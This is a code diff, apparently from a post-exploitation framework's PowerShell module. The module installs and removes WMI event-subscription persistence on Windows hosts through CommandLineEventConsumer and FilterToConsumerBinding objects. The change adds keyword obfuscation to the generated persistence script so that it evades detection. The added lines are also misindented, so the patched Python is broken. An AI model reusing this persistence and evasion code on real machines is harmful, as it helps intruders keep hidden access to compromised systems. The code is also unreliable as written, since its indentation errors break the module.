@@ -136,8 +136,9 @@ class Module(object):
             script += "Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter \"name='" + subName + "'\" | Remove-WmiObject;"
             script += "Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '" + subName + "'} | Remove-WmiObject;"
             script += "'WMI persistence removed.'"
-            if obfuscate:
-                script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
+                script = helpers.keyword_obfuscation(script, self.mainMenu)
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                            obfuscationCommand=obfuscationCommand)
             return script
 
@@ -226,6 +227,7 @@ class Module(object):
         script += " Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"
 
         script += "'WMI persistence established " + statusMsg + "'"
+            script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script,
                                        obfuscationCommand=obfuscationCommand)
